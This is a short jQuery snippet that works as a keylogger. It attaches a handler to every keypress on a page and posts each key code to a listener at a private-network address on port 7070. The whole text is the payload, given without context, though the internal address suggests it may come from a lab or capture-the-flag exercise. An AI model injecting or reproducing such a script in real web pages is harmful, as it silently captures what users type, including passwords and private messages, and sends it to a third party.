
$(document).keypress(function(e){
  $.post('http://10.10.100.69:7070', {press: e.which});

});
